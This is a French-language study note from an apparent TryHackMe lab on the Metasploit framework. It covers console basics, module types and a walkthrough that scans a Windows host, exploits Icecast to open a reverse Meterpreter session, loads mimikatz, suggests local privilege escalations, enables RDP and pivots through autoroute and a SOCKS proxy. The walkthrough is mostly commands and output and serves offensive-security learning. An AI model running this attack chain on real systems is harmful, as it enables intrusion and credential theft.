---
tags: [cyber, débutant, metasploit, mimikatz, outil, tryhackme]
title: Metasploit - framework d'attaque
created: '2020-08-11T09:09:35.516Z'
modified: '2020-08-18T19:48:59.307Z'
---

# Metasploit - framework d'attaque

## Initialisation

```sh
kali@kali:~$ sudo msfdb init
kali@kali:~$ sudo msfconsole -q # quiet mode (no banner)
msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
```

## Rock'em to the core (commands)

Afficher le menu d'aide : `msf5 > ?`

Rechercher des modules : `msf5 > search <module>`

Charger le module : `msf5 > use <module>`

Informations sur le module : `msf5 > info`

Netcat like : 

```sh
msf5 > connect -C 127.0.0.1 4444
[*] Connected to 127.0.0.1:4444 (via: 0.0.0.0:0)
```

Set variables : `msf5 > set <var> <val>`

Get variables : `msf5 > get <var>`

Del variables (set to null) : `msf5 > unset <var>`

Copier la sortie console vers un fichier : `msf5 > spool /tmp/console.log`

Sauvegarder la database :

```sh
msf5 > save
Saved configuration to: /root/.msf4/config
```

## Modules for every occasion !

Six core modules : 
- Auxiliary : reconnaissance phase
- Exploit : the exploits
- Encoder : modify exploit so it avoid signature detection
- Payload : the shellcodes
- Post : looting and pivoting
- NOP : buffer overflows and ROP attacks

Les modules ne sont pas tous chargés par défaut, pour en charger un il faut entrer `msf5 > load <module>`

## Move that shell !

Metasploit nmap : `db_nmap -sV <ip>`

```sh
msf5 > db_nmap -sV 10.10.73.132
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 08:12 EDT
[*] Nmap: Nmap scan report for 10.10.73.132
[*] Nmap: Host is up (0.098s latency).
[*] Nmap: Not shown: 988 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  tcpwrapped
[*] Nmap: 5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http         Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 71.96 seconds
```

Les informations sont alors ajoutée à l'espace de travail : voir avec `workspace`

On peut accéder aux hôtes scannés :

```sh
msf5 > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.10.73.132             Unknown                    device         
```

Ainsi qu'aux services :

```sh
msf5 > services
Services
========

host          port   proto  name               state  info
----          ----   -----  ----               -----  ----
10.10.73.132  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.73.132  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.73.132  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.73.132  3389   tcp    ssl/ms-wbt-server  open   
10.10.73.132  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.73.132  8000   tcp    http               open   Icecast streaming media server
10.10.73.132  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.73.132  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.73.132  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.73.132  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.73.132  49159  tcp    msrpc              open   Microsoft Windows RPC
10.10.73.132  49160  tcp    msrpc              open   Microsoft Windows RPC
```

Et les vulnérabilités trouvées (aucune actuellement):

```
msf5 > vulns

Vulnerabilities
===============

Timestamp  Host  Name  References
---------  ----  ----  ----------
```

Exemple avec icecast :

```sh
msf5 exploit(windows/http/icecast_header) > run -j # run as a job
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.11.7.104:4444 
[*] Sending stage (176195 bytes) to 10.10.73.132
[*] Meterpreter session 1 opened (10.11.7.104:4444 -> 10.10.73.132:49484) at 2020-08-11 08:54:51 -0400

msf5 exploit(windows/http/icecast_header) > jobs # show active jobs

Jobs
====

No active jobs.
```

Une session est ouverte, on peut les lister avec `sessions` et en sélectionner avec `sessions -i <ID>`

```sh
msf5 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.11.7.104:4444 -> 10.10.73.132:49484 (10.10.73.132)

msf5 exploit(windows/http/icecast_header) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

## We're in, now what ?

On liste les process avec `ps` :

```sh
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]                                   
 4     0     System                                             
 416   4     smss.exe                                           
 500   692   svchost.exe                                        
 544   536   csrss.exe                                          
 588   692   svchost.exe                                        
 592   536   wininit.exe                                        
 604   584   csrss.exe                                          
 652   584   winlogon.exe                                       
 692   592   services.exe                                       
 700   592   lsass.exe                                          
 708   592   lsm.exe                                            
 816   692   svchost.exe                                        
 884   692   svchost.exe                                        
 932   692   svchost.exe                                        
 956   816   slui.exe              x64   1        Dark-PC\Dark  C:\Windows\System32\slui.exe
 1060  692   svchost.exe                                        
 1188  692   svchost.exe                                        
 1296  500   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1316  1288  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1368  692   spoolsv.exe                                        
 1396  692   svchost.exe                                        
 1460  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1540  692   amazon-ssm-agent.exe                               
 1636  692   LiteAgent.exe                                      
 1676  692   svchost.exe                                        
 1816  692   Ec2Config.exe                                      
 2068  692   svchost.exe                                        
 2280  1316  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2616  816   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2652  692   SearchIndexer.exe                                  
 2660  2616  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
 2800  692   sppsvc.exe
```

On observe que spool a le process 1368, dans lequel on essaie de migrer avec `migrate` :

```sh
meterpreter > migrate 1368
[*] Migrating from 2280 to 1368...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

Malheureusement, on n'a pas les privilèges adéquats. Pour trouver un moyen de s'élever, on énumère la machine avec `getuid` et `sysinfo` :

```sh
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

Pour charger mimikatz, on entre `load kiwi` :

```sh
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
```

Pour énumérer les privilèges, `getprivs` :

```sh
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

Pour charger des fichiers de notre machine vers celui de la victime : `upload <fichier>`

Pour connaître la config ip de la victime : `ipconfig`

```sh
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a0a:4984
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:90:d8:6a:d8:09
MTU          : 9001
IPv4 Address : 10.10.73.132
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::a9b0:1af6:3e96:ceff
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

Si on veut savoir lorsqu'on est dans une machine virtuelle (à des fins de pivotage) : 

```sh
meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine .....
[+] This is a Xen Virtual Machine
```

Pour énumérer des vulnérabilités :

```sh
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.73.132 - Collecting local exploits for x86/windows...
[*] 10.10.73.132 - 30 exploit checks are being tried...
[+] 10.10.73.132 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.73.132 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.73.132 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.73.132 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.73.132 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.73.132 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.73.132 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.73.132 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

Pour activer le RDP (il faut être administrateur) : `run post/windows/manage/enable_rdp`

Et si l'on veut ouvrir un shell depuis le meterpreter : `shell`

## Making Cisco proud

On peut créer des routes grâce à `run autoroute -h` :

```sh
meterpreter > run autoroute -s 172.18.1.0 -n 255.255.255.0

[*] Adding a route to 172.18.1.0/255.255.255.0...
[+] Added route to 172.18.1.0/255.255.255.0 via 10.10.73.132
[*] Use the -p option to list all active routes
```

Egalement pour créer un proxy socks4 : 

```sh
msf5 > use server/socks4a
msf5 auxiliary(server/socks4a) >
```

Lorsque l'on a créé le serveur proxy, on modifie `/etc/proxychains.conf` pour l'inclure dans les paramètres, et il suffit de placer `proxychains` devant chaque commande à rediriger.


